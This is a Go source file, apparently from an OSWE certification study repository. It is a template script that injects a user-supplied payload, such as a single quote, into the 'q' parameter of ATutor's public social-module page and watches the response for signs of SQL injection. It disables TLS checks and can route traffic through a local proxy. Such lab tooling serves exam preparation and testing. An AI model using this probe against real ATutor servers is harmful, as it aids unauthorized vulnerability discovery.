package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"regexp"

	"github.com/iPhantasmic/OSWE/scripts/utils"
)

// Welcome to OSWE in Golang

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func sendStage1(debug bool, ip string, payload string) {
	// do necessary URL manipulation
	requestURL := fmt.Sprintf("http://%s/ATutor/mods/_standard/social/index_public.php?q=%s", ip, payload)

	// send the request
	response := utils.SendGetRequest(client, debug, requestURL)

	// regex to check for stage success
	match, _ := regexp.MatchString("success indicator", response.ResponseBody)
	if match {
		utils.PrintSuccess("Error found in application response. Possible vulnerability found!")
	} else {
		utils.PrintFailure("No errors found in application response.")
	}
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	debug := flag.Bool("debug", false, "debug mode")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 3 {
		utils.PrintFailure(fmt.Sprintf("usage: %s [-proxy=<proxyIP>] [-debug=true] <target> <payload>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.121.103 \"AAAA'\"", os.Args[0]))
		os.Exit(1)
	}

	ip := flag.Arg(0)
	payload := flag.Arg(1)

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			Proxy:           http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
	}

	// create our HTTP client using the above transport
	client = &http.Client{Transport: tr}

	sendStage1(*debug, ip, payload)
}
